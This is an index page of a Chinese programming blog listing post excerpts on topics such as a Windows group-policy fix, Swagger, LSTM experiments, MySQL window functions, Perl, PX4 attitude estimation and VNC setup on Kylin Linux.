<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9cae48e9fd2497c07df172a919dc843/" rel="bookmark">
			管理员已经阻止软件运行bug的解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今天在打串口驱动时以外遇到了这个问题，于是在网上找了一些解决方案。
第一步，按下win+R，输入“gpedit.msc”，然后发现不存在内容？？？
经检查发现我的电脑系统是家庭版，所以并没有组策略管理器。于是又查找了解决办法。找到的方法是编写一个.bat批处理文件创建一个组策略管理器。
@echo off pushd "%~dp0" dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientExtensions-Package~3*.mum &gt;List.txt dir /b C:\Windows\servicing\Packages\Microsoft-Windows-GroupPolicy-ClientTools-Package~3*.mum &gt;&gt;List.txt for /f %%i in ('findstr /i . List.txt 2^&gt;nul') do dism /online /norestart /add-package:"C:\Windows\servicing\Packages\%%i" pause 随后将其以管理员身份运行，等待创建完成后再按下win+R并输入“gpedit.msc”即可。
第二步：在组策略管理器中依次找到【计算机配置--&gt;Windows设置--&gt;安全设置--&gt;本地策略--&gt;安全选项】，最后在其中找到“以管理员批准运行所有管理员”的策略并将其禁用。随后重启电脑即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f5a5cd75efd2d89e38b7750be89a6efe/" rel="bookmark">
			Swagger使用教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		个人笔记,不喜勿喷 第一步:导依赖 &lt;!--swagger2的核心包--&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;!--swagger2的ui界面包 底层用的thymeleaf--&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 第二步: 配置类 : SwaggerConfig import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.ParameterBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.schema.ModelRef; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import springfox.documentation.service.Parameter; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2; import java.util.ArrayList; import java.util.List; @Configuration @EnableSwagger2 public class SwaggerConfig { @Bean public Docket createRestApi() { List&lt;Parameter&gt; pars = new ArrayList&lt;&gt;(); pars.add(new ParameterBuilder() .name("token") .description("token") .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f5a5cd75efd2d89e38b7750be89a6efe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e48eedf2292db6dc327fb846551d55f/" rel="bookmark">
			算法设计与分析——两个序列的中位数（Java）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【问题】一个长度为 n(n≥1) 的升序序列 S，处在第 n/2 个位置的数称为序列 S 的中位数(median number)，例如，序列 S1={11,13,15,17,19} 的中位数是 15。两个序列的中位数是它们所有元素的升序序列的中位数，例如，S2={2,4,6,8,20}，则 S1 和 S2 的中位数是11。现有两个等长升序序列 A 和 B，试设计一个在时间和空间两方面都尽可能高效的算法，找出两个序列的中位数。
【想法】算法的基本思想如下。
(1）分别求出两个序列的中位数，记为 a 和 b 。
(2）比较 a 和 b，有下列三种情况：
a=b，则 a 即为两个序列的中位数；
a&lt;b，则中位数只能出现在 a 和 b 之间，在序列 A 中舍弃 a 之前的元素得到序列 A1，在序列 B 中舍弃 b 之后的元素得到序列 B1；
a&gt;b，则中位数只能出现在 b 和 a 之间，在序列 A 中舍弃 a 之后的元素得到序列 A1，在序列 B 中舍弃 b 之前的元素得到序列 B1。
(3）在 A1 和 B1 中分别求出中位数，重复上述过程，直到两个序列中只有一个元素，则较小者即为所求。
例如，对于两个给定的序列 A={11,13,15,17,19}，B={2,4,10,15,20}，求序列 A 和 B 的中位数的过程如下表所示，在求解过程中注意保持两个序列的长度相等。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e48eedf2292db6dc327fb846551d55f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f28991c78bf02454dc30cc42ce7e92d/" rel="bookmark">
			神经网络与深度学习（七）循环神经网络（3）LSTM的记忆能力实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
6.3 LSTM的记忆能力实验
6.3.1 模型构建
6.3.1.1 LSTM层
6.3.1.2 模型汇总 6.3.2 模型训练 6.3.2.1 训练指定长度的数字预测模型 6.3.2.2 多组训练 6.3.2.3 损失曲线展示 【思考题1】LSTM与SRN实验结果对比，谈谈看法。
6.3.3 模型评价 6.3.3.1 在测试集上进行模型评价 6.3.3.2 模型在不同长度的数据集上的准确率变化图 【思考题2】LSTM与SRN在不同长度数据集上的准确度对比，谈谈看法。 6.3.3.3 LSTM模型门状态和单元状态的变化 【思考题3】分析LSTM中单元状态和门数值的变化图，并用自己的话解释该图。 总结RNN
参考资料
使用LSTM模型重新进行数字求和实验，验证LSTM模型的长程依赖能力。 6.3 LSTM的记忆能力实验 长短期记忆网络（Long Short-Term Memory Network，LSTM）是一种可以有效缓解长程依赖问题的循环神经网络．LSTM 的特点是引入了一个新的内部状态（Internal State）和门控机制（Gating Mechanism）．不同时刻的内部状态以近似线性的方式进行传递，从而缓解梯度消失或梯度爆炸问题．同时门控机制进行信息筛选，可以有效地增加记忆能力．例如，输入门可以让网络忽略无关紧要的输入信息，遗忘门可以使得网络保留有用的历史信息．在上一节的数字求和任务中，如果模型能够记住前两个非零数字，同时忽略掉一些不重要的干扰信息，那么即时序列很长，模型也有效地进行预测.
LSTM 模型在第步时，循环单元的内部结构如下图所示． 假设一组输入序列为，其中为批大小，为序列长度，为输入特征维度，LSTM从从左到右依次扫描序列，并通过循环单元计算更新每一时刻的状态内部状态和输出状态。
具体计算分为三步：
1）计算三个“门”
在时刻，LSTM的循环单元将当前时刻的输入与上一时刻的输出状态，计算一组输入门、遗忘门和输出门，其计算公式为
其中,,为可学习的参数，表示Logistic函数，将“门”的取值控制在(0,1)区间。这里的“门”都是个样本组成的矩阵，每一行为一个样本的“门”向量。
2）计算内部状态
首先计算候选内部状态：
其中,,为可学习的参数。
使用遗忘门和输入门，计算时刻tt的内部状态：
其中⊙为逐元素积。
3）计算输出状态
当前LSTM单元状态（候选状态）的计算公式为:
LSTM单元状态向量和的计算公式为
LSTM循环单元结构的输入是时刻内部状态向量和隐状态向量，输出是当前时刻tt的状态向量和隐状态向量。通过LSTM循环单元，整个网络可以建立较长距离的时序依赖关系。
通过学习这些门的设置，LSTM可以选择性地忽略或者强化当前的记忆或是输入信息，帮助网络更好地学习长句子的语义信息。
在本节中，我们使用LSTM模型重新进行数字求和实验，验证LSTM模型的长程依赖能力。
6.3.1 模型构建 在本实验中，我们将使用第6.1.2.4节中定义Model_RNN4SeqClass模型，并构建 LSTM 算子．只需要实例化 LSTM 算，并传入Model_RNN4SeqClass模型，就可以用 LSTM 进行数字求和实验
6.3.1.1 LSTM层 LSTM层的代码与SRN层结构相似，只是在SRN层的基础上增加了内部状态、输入门、遗忘门和输出门的定义和计算。这里LSTM层的输出也依然为序列的最后一个位置的隐状态向量。代码实现如下： import torch import torch.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f28991c78bf02454dc30cc42ce7e92d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1f899026660831f2bcbfc212d5135828/" rel="bookmark">
			【数据库高级】Mysql窗口函数的使用和练习
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Mysql窗口函数 🌾Mysql窗口函数🕊️一、什么是窗口函数🍃1、怎么理解窗口?🍃2、什么是窗口函数🍵1. 基本语法：🍵2. 窗口函数多用在什么场景？主要有以下两类：🍵3. 我们常见的窗口函数和聚合函数有这些：🍵4. 窗口函数和普通聚合函数的区别？ 🕊️二、窗口函数的练习🍃1、序号函数🍃2、分布函数：🍃3、前后函数🍃4、首尾函数🍃5、其他函数 🕊️三、实战 🌾Mysql窗口函数 本文主要介绍了MySQL窗口函数的定义和具体使用。
首先窗口函数是从MySQL8.0开始支持的，如果现在使用的是MySQL5.0或者8.0一下的版本，那么非常遗憾，建议搞个8.0版本试一试，哈哈~
🕊️一、什么是窗口函数 🍃1、怎么理解窗口? 搞清楚窗口代表着啥，才知道什么时候该用它。
窗口函数是相对于聚函数来说的。
聚合函数是对一组数据计算后返回单个值（即分组）。非聚合函数一次只会处理一行数据。而窗口函数在行记录上计算某个字段的结果时，可将窗口范围内的数据输入到聚合函数中，并不改变行数。 根据上面所说，准备如下员工表信息数据
-- 员工表 create table if not exists sql_niukewang.`employee` ( `eid` int not null auto_increment comment '员工id' primary key, `ename` varchar(20) not null comment '员工名称', `dname` varchar(50) not null comment '部门名称', `hiredate` date not null comment '入职日期', `salary` double null comment '薪资' ) comment '员工表'; insert into sql_niukewang.`employee` (`ename`, `dname`, `hiredate`, `salary`) values ('傅嘉熙', '开发部', '2022-08-20 12:00:04', 9000); insert into sql_niukewang.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1f899026660831f2bcbfc212d5135828/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b3424bade12c28983ba6d22e3f4273c/" rel="bookmark">
			ESP8266 SmartConfig一键配网
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		ESP8266 SmartConfig一键配网 Wi-Fi 配网，指由外部向 Wi-Fi 设备提供 SSID 和密码（PSW），让 Wi-Fi 设备可以连接指定的热点或路由器，并加入后者所建立的 Wi-Fi 网络。
对于具备丰富人机界面包括屏幕/键盘的设备，例如电脑或手机，可以直接输入 SSID/PSW 进行连接。
对于不具备丰富人机交互界面的物联网 Wi-Fi 设备，例如智能灯、扫地机器人等，则可以借助手机等智能设备，以某种配网方式将 SSID/PSW 传递该设备。
1.基本原理 1.设备进入 Wi-Fi 混杂模式（promiscuous mode）以监听捕获周围的 Wi-Fi 报文。由于设备暂未联网，且 Wi-Fi 网络的数据帧已通过加密，设备无法获取 payload 的内容，但可以获取报文的某些特征数据，例如每个报文的长度。同时对于某些数据帧，例如 UDP 的广播包或多播包，其报文的帧头结构比较固定，较容易识别。
2.此时在手机 App 或者小程序侧，即可通过发送 UDP 的广播包或多播包，并利用报文的特征，例如长度变化进行编码。
3.将目标 Wi-Fi 路由器的 SSID/PSW 字符以约定的编码方式发送出去，设备端在捕获到 UDP 报文后，按约定的方式进行解码，即可得到目标 Wi-Fi 路由器的相关信息并进行联网。
2.配网流程 SmartConfig 方式配网，每个厂商的编码方式和报文选择上有自己的协议，对于 ESP8266，采用的协议是乐鑫 ESP-TOUCH协议。
基于该协议，设备端在连接 Wi-Fi 路由器成功后，将会告知手机端自己的 IP 地址。
此时手机端可以通过数据通道，例如 TCP/UDP 通讯将后台提供的配网 Token 发送给设备，并由设备转发至物联网后台，依据 Token 进行设备绑定。
目前腾讯连连小程序已支持采用 ESP-TOUCH 协议进行 SmartConfig 配网，并提供相应的 小程序 SDK。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b3424bade12c28983ba6d22e3f4273c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ffeaafd883929a22df745f119e2fd119/" rel="bookmark">
			使用Perl生成随机密码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可以通过参数控制生成密码中包括的字符种类
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ffeaafd883929a22df745f119e2fd119/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e0a2808a82eca3222ab326fb9e25b7e0/" rel="bookmark">
			Perl与JS的对比分析(数组、哈希)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、数组
可以对数组进行增删，插入。与JS不同的是这些函数都是全局的，JS则是挂在Array.prototype上。
1，对数组尾部的操作pop（删除最后的元素）、push（在尾部添加）
1
2
3
@goods = qw/pen pencil/; pop(@goods); # @goods 变成 (pen) push(@goods, 'brush'); # @goods 变为 (pen, brush) 在Perl中，函数调用时小括号是可选的（视上下文而定），就象前面使用的print。以下是等价的
1
2
pop @goods; # @goods 变成 pen push @goods, 'brush'; # @goods 变为 (pen, brush) 2，对数组首部的操作shift（删除第一个元素）、unshift（在首部添加元素）
3，任意位置删除或插入splice
4，逆序数组，Perl有reverse函数，JS没有对应函数。
5，排序数组sort，Perl和JS都有。
2，3，4，5提到的函数不贴演示代码了。
6，JS使用length属性获取数组长度，Perl不同，有3种方式获取
1
2
3
4
5
6
7
8
9
10
@goods = qw/pen pencil/; # 将数组变量赋值给一个标量变量 $len = @goods; # 使用scalar函数 $len = scalar(@goods); # 最后一个元素的索引加1 $len = $#goods + 1; 7，遍历数组，Perl用foreach函数
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e0a2808a82eca3222ab326fb9e25b7e0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2d546e92d97e0bf7a2681cb02b650c2/" rel="bookmark">
			Perl 批量添加Copyright版权信息
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		对所有输入文件，如果没有版权信息则加上版权信息，否则什么都不做，并对原文件以.bak结尾备份。
开始我使用如下程序（尝试前千万先备份输入的文件）：
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
#!usr/bin/perl -w
$^I = ".bak";
my %do_these;
foreach (@ARGV){
print $_;
$do_these{$_} = 1;
}
while(&lt;&gt;){
if(/^## Copyright/){
delete $do_these{$ARGV};
}
}
@ARGV = sort keys %do_these;
while(&lt;&gt;){
if(/^#!/){
$_ .= "## Copyright (C) 2011 by yujianjun";
}
print;
}
结果：原文件和备份文件全部空白，真是糟糕。（切记以后测试程序时，要做好备份）。
分析原因：
主要是由于$^I使用错误。先来看看关于$^I的运作原理：
$^I 默认值undef，这不会影响程序。如果将其赋值为某个字符串（如程序中的".bak"），程序将执行备份操作，并将该字符串添加到原文件名后面，成为备份文件名的拓展名。使用钻石操作符打开文件时，perl的操作是，先将打开的文件名改成加了拓展名的文件名，然后再新建一个原来的文件名的文件，然后在程序一行行读入文件内容并做一些改动后，会保存到新文件中去。这样就相当于修改了文件内容，并将老文件进行了备份。当然，如果值是undef，则不会备份旧文件。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2d546e92d97e0bf7a2681cb02b650c2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/948a3c30e3edf322cf26183e99ce13fb/" rel="bookmark">
			Perl字符串比较和整数比较的区别详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Perl语言中Perl字符串可分为单引号和双引号字符串,那么如何进行Perl字符串比较呢,
请看本文详细介绍:
本文和大家重点讨论一下Perl字符串比较和整数比较,
算术运算符的比较有大于，小于，等于，不等于等关系,
而Perl字符串比较也不例外,
这里向大家详细介绍一下:
一. 字符串比较操作符
操作符 描述　lt 小于　gt 大于　eq 等于　le 小于等于　ge 大于等于　ne 不等于　cmp 比较, 返回1,0,or-1　二. 整数比较操作符
操作符 描述
&lt; 小于
&gt; 大于
== 等于
&lt;= 小于等于
&gt;= 大于等于
!= 不等于
&lt;=&gt; 比较，返回1, 0, or -1
PS:
整数比较操作符是数值比较,
使用时会把左右操作数都转化为数字。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/978b334b8dffe145dccfd996411e0cdf/" rel="bookmark">
			Vue一babel.config.js配置文件详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、概述
Vue项目根目录中存在babel..config.js文件，即为Babel的配置文件，作用于整个项目。Vue项目中普遍使用ES6语法，若要求兼容低版本浏览器，就需要引入Babel,将ES6转换为ES5。
详情请参考Babel中文文档：https:www.babeljs.cn/。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d63d7120327618bcb91b62dc6a42b3f/" rel="bookmark">
			pytorch MNIST 手写数字识别 &#43; 使用自己的测试集 &#43; 数据增强后再训练
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. MNIST 手写数字识别2. 聚焦数据集扩充后的模型训练3. pytorch 手写数字识别基本实现3.1完整代码及 MNIST 测试集测试结果3.1.1代码3.1.2 MNIST 测试集测试结果 3.2 使用自己的图片进行测试3.2.1 测试图片预处理代码3.2.2 测试图片结果 4. 数据增强4.1 手动读取 MNIST 数据集4.2 数据增强4.2.1 像素反转4.2.2 图像旋转4.2.2.1 图像类别统计4.2.2.2 根据类别进行等量均类划分 4.2.3 像素反转 + 图像旋转4.2.4 选择加载不同的处理后的数据集 4.3 完整代码 5. 模型再训练5.1 怎么加载 split 后的数据？5.1.1 创建自己的 dataset 类5.1.2 load 分割好的数据 5.2 加载完成后怎么和原始数据合并，然后送入模型进行训练？5.3 完整代码5.4 训练结果5.4.1 只进行像素反转5.4.1.1 测试结果5.4.1.2 在自己的数据上测试测试代码测试结果 5.4.2 只进行图像旋转5.4.2.1 测试结果5.4.2.2 在自己的数据上测试测试代码测试结果 5.4.3 二者同时进行5.4.3.1 测试结果5.4.3.2 在自己的数据上测试测试代码测试结果 5.5 结果整合 结语 1. MNIST 手写数字识别 MNIST 数据集分为两部分，分别是训练集和测试集，其中训练集含有 60000 张图片，测试集中含有 10000 张图片。从官网下载的数据集主要包括有 4 个文件：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d63d7120327618bcb91b62dc6a42b3f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8a3731ad4728bd56f2700d60bdc94007/" rel="bookmark">
			PX4代码解析(6)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、前言 上一节介绍了PX4姿态估计调用函数的流程，这一节分享一下我对PX4姿态解算的解读.首先，要理解PX4姿态解算的程序，要先从传感器的特性入手，这里主要介绍的传感器有加速度计，磁力计，陀螺仪.
二、传感器特性 1.加速度计 pixhawk上使用的为三轴加速度计，主要用于测量x,y,z三轴的加速度值，常用的传感器例如mpu6000与mpu9250，在进行PX4二次开发时，我们并不需要编写加速度计相关驱动程序，其代码已经在PX4_Firmware/src/drivers/imu下进行了实现，感兴趣可以自己查阅.这里我们只需了解加速度计的原理与特性.
如图所示，该图为加速度计简易模型，由弹簧与质量块构成，当外界有加速度时，质量块位置会发生变化，从而使得电容两端距离改变，流经电容的电流也会发生变化，通过测量电流大小，就可以得到质量块移动距离，从而得到加速度大小。理想状态下，当没有外界作用时，质量块会处于零点位置，但由于工艺，使用时间长短等各种因素，质量块可能会处于非零点位置，即所谓零偏，因此，在飞无人机之前往往需要进行校准。
此外，加速度计校准还涉及到另一个参数，这个参数是标度因数，在这里可以理解为一个比例系数，测量值乘以这个比例系数后得到实际值。
从加速度原理可以看出，在测量加速度时质量块需要不断移动，移动需要时间，因此，在高频情况下加速度计值不一定准确，低频率特性比较好.
2.陀螺仪 pixhawk上另一个比较重要的传感器就是陀螺仪，陀螺仪用于测量x,y,z三轴角速度，其基本的原理是动量守恒。当外部系统发生旋转时，内部转动装置会保持恒定的速度与方向旋转，测量这两个系统的差就可以得到当前系统角速度。为了测量x,y,z三轴角速度，通常采用万向节构成转动装置
以其中一个方向为例，当陀螺仪测量装置随着转动轴转动时，在半径方向上会存在力，使得质量块在半径方向进行周期往复运动，从而得到旋转角速度.但由于存在零点漂移，陀螺仪在低频特性较差，高频特性较好.
3.磁力计 磁力计主要用于测量当前磁场强度。为了能够测量地磁方向，通常将地磁分为水平与垂直方向，水平方向可以近似表示地磁方向。但地球的磁轴与地轴有着夹角，一般称为磁偏角，磁偏角在不同地理位置不同，因此在无人机航向计算时，需要gps获得当前经纬度，然后查表得到当前位置磁偏角，对航向进行修正（后续代码中会看到）.同样的磁力计校正也涉及到偏移与标度因数.
三、姿态解算算法 1.为什么采用四元数计算 在介绍姿态解算算法前，先来谈谈姿态的表示方式，常用的姿态表示方法有：四元数，欧拉角，方向余弦这几种方式，并且这几种方式是可以 互相转换，欧拉角虽然计算简单，但是存在退化现象；方向余弦有9个参数，导致其计算量过大，实时性不好；因此，PX4源码中采用四元数来表示姿态。
2.姿态解算的坐标系 在无人机的坐标变换过程中，一般会涉及到以下四个坐标系
1.传感器坐标系
传感器本身具有自己的测量坐标系，在安装过程中会存在安装误差，而传感器读数是在传感器坐标系下测得，为了能让无人机使用，需要将其转换到机体坐标系。但加速度计，磁力计，陀螺仪这些传感器安装时一般与无人机机体中心位置与方向都重合，所以可以粗略认为传感器坐标系与无人机坐标系重合
2.机体坐标系
一般以无人机几何中心为中心，以右手定则建立的三维直角坐标系，x轴位于无人机机体平面，以无人机前进方向为正方向；y轴在机体平面且垂直x轴，z轴垂直机体平面，以向下为正.
3.本地坐标系（local）
为了确定无人机相对于地面的速度与位置，需要引入本地坐标系（仿真中常用的地面坐标系）。一般情况下，本地坐标系是以无人机起点为坐标中心，在水平面上正北方向为x轴，正东为y轴方向，z轴垂直地面向下，这也是所谓的北东地（NED）坐标系
4.全局坐标系（global）
前面提到，在不同经纬度下，地轴与磁轴之间的磁偏角是不一样的，为了修正无人机航向，还需要引入GPS测得的地球经纬度.
3.Mahony滤波算法 下面来讲解算法，如图为mahony滤波的流程图，取自文献[1]
先来解释一下上图：
1. a , m a,m a,m与 ω \omega ω分别是加速度计测得的加速度，磁力计测得的磁场强度以及陀螺仪测得的角速度。其实这里就引出了一个问题，为什么需要加速度计与磁力计，光靠陀螺仪不就可以得到无人机姿态吗？
确实，光靠陀螺仪是可以得到无人机姿态的，通过对得到的角速度积分就得到了姿态，但靠积分得到的姿态会存在积分误差，这个光靠陀螺仪是无法解决的，因此引入了加速度计与磁力计来解决陀螺仪积分误差。
2.四元数微分方程为 Q ˙ = 1 2 ⊗ ω n b b \dot{Q} =\frac{1}{2} \otimes \omega _{nb}^{b} Q˙​=21​⊗ωnbb​,式中 Q Q Q为姿态四元数， ω n b b \omega _{nb}^{b} ωnbb​为无人机机体坐标系b相对于北东地（NED）坐标系n的角速度，这个式子是姿态解算的核心
3.由加速度计与磁力计得来的姿态同样存在误差，因此需要PI控制器来对误差进行修正，PI控制器的输入是由加速度计与磁力计算出的姿态与最终通过四元数微分方程计算出的实际姿态的差值，输出角速度修正值，补偿到陀螺仪，抵消陀螺仪误差
4.这个过程在无人机运行过程中循环计算，不断进行姿态解算
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8a3731ad4728bd56f2700d60bdc94007/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6d77b4d49fc4a6dd04555483606d39e8/" rel="bookmark">
			Postgres时间字段设置默认值
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字段类型选择 timestamp
默认值项填 CURRENT_TIMESTAMP
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a16d76d8bb0be45a7a580d2a2315f05f/" rel="bookmark">
			【PTA】【878真题】浙江大学软件学院878自命题2019真题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		说明：
题目来自PTA平台的C语言与数据结构考研模拟卷（4）部分题目没答案是因为博主也做错了，不知道正确答案如果有不会做的题目或者知道正确答案，可以评论或者私信我，谢谢 选择题 2-1 要使变量 n 被赋值为 8，则需要在表达式 n = (13&amp;xxx); 的xxx 处填____。
选项A12B 10C6D5 2-2 要定义一个乘法运算的宏函数，以下最恰当的是____。
选项A#define SUB(X,Y) (X*Y)B#define SUB(X,Y) (X)*(Y)C#define SUB(X,Y) ((X)*(Y))D都恰当 2-3 若有定义int x=3, y=2和float a=3.6, b=1.8，则表达式(x+y)%2+a/(int)b的值是___。
选项A3B 4C5D6 2-4 下列程序段的输出结果是__。
int main() { int a = 1, b = 2; switch(a&lt;b) { case 0: b++; case 1: a++; case 2: a++; b++; } printf("a=%d,b=%d\n",a,b); return 0; } 选项Aa=1,b=3Ba=2,b=2Ca=3,b=3Da=3,b=4 2-5 语句 for(int i=0,j=10; i=j=10; i++,j--);中的循环执行次数是____
选项A1B10C11D无限次 2-6 执行以下程序段后，变量i的值是___。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a16d76d8bb0be45a7a580d2a2315f05f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9408b1e4139fe70e46ca1a772ddb8c9f/" rel="bookmark">
			windocs连接麒麟桌面---vnc软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、下载vnc
二、麒麟服务器安装VNC远程
三、客户端连接
一、下载vnc客户端
Download VNC Viewer 6.22.826 - free - latest version
二、麒麟服务器安装VNC远程 1.在服务器安装 tigervnc-server
yum install tigervnc-server -y 2.创建VNC会话服务，用于后续设置开机自启等功能； cp /usr/lib/systemd/system/vncserver@.service /etc/systemd/system/vncserver@:1.service 注意：这里“vncserver@:1.service”中对“@:1”代表的是第一个VNC session（VNC会话），其对应监听的端口号为5901。当然，你也可以添加第二个VNC session，其服务文件为“/etc/systemd/system/vncserver@:2.service”，对应监听的端口号为5902。以此类推… 3.修改vncserver会话服务文件； vi /etc/systemd/system/vncserver@:1.service 修改的地方&lt;USER&gt; 修改为kylin
4.切换到VNC会话连接账户（本教程中为kylin），并设置VNC连接密码；
[root@kylin ~]# su kylin
[kylin@kylin root]$ vncpasswd （输入两次密码，确认密码，密码大小写字符）
5.切换回root账户，重新加载VNC会话服务，并设置开机自启；
[kylin@kylin root]$ su root
[root@kylin ~]# systemctl daemon-reload
[root@kylin ~]# systemctl enable --now vncserver@:1.service
passwd kylin 设置kylin用户登录密码
6.防火墙放行VNC会话服务监听端口；
[root@kylin ~]# firewall-cmd --add-port=5901/tcp --permanent
[root@kylin ~]# firewall-cmd --add-port=5901/udp --permanent
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9408b1e4139fe70e46ca1a772ddb8c9f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b4d3cb9388e7f4a4eb9bec446be7c8b8/" rel="bookmark">
			NNDL 实验七 循环神经网络（3）LSTM的记忆能力实验
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
